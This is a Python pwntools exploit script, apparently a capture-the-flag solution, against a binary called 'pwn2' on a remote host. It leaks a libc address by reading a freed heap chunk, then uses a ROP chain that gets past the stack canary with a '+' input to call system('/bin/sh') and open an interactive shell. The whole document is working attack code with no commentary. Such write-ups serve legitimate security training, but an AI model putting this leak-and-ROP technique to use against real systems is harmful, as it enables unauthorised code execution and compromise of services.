from pwn import *
context.binary = exe = ELF("./pwn2",checksec = False)
libc = ELF("./libc.so.6")
def GDB():
    gdb.attach(p,gdbscript='''
    b* main + 237
    b* main + 387
    c
    '''
    )
    input()

def leak():
    p.sendlineafter(b"what do you like to do?",b"1")
    p.sendlineafter(b"(max is 5 though)",b"2")
    for i in range(2):
        p.sendlineafter(b"how long is your review?",f"{0x500}".encode())
        p.sendline(b"A"*0x400)
    
    p.sendlineafter(b"what do you like to do?",b"3")
    p.sendlineafter(b"which review you want to remove??",b"0") # FREE CHUNK 0

    p.sendlineafter(b"what do you like to do?",b"2")
    p.sendlineafter(b"Which review you want to look back!!!!",B"0") # view chunk 0  which now in unsorted bin and have libc address
    p.recvline()
    leak = int.from_bytes(p.recvline()[:-1],"little")
    libc.address = leak - 0x219ce0
    log.info('[+]LEAK:'+hex(libc.address)) 
def pwn():
    rdi = libc.address + 0x000000000002a3e5
    rdx = libc.address + 0x00000000000796a2
    rsi = libc.address + 0x000000000002be51
    rw_section = libc.address + 0x219000 + 0x500
    rax = libc.address + 0x0000000000045eb0
    syscall = libc.address + 0x0000000000091316
    ret = libc.address + 0x0000000000029139
    p.sendlineafter(b"what do you like to do?",b"4")
    p.sendlineafter(b"(max is 10 tho)",b"10")
    for i in range(10):
        p.sendline(b"10")
    payload = [
        rw_section,
        rdi,
        next(libc.search(b"/bin/sh\x00")),
        rsi,0,rdx,0,
    ]

    p.sendlineafter(b"what do you like to do?",b"4")
    p.sendlineafter(b"(max is 10 tho)",f"{len(payload)+2}".encode())
    p.sendline(b"1")
    p.sendline(b"+") # canary 

    for i in range(len(payload)):
        p.sendline(f"{payload[i]}".encode())

    payload = [
        ret,libc.sym['system']
    ]
    p.sendlineafter(b"what do you like to do?",b"4")
    p.sendlineafter(b"(max is 10 tho)",f"{len(payload)}".encode())
    p.sendline(f"{payload[0]}".encode())
    p.sendline(f"{payload[1]}".encode())

    p.sendlineafter(b"what do you like to do?",b"5")
    
#p = process(exe.path)
p = remote("103.162.14.116", 20002)
#GDB()
leak()
pwn()


p.interactive()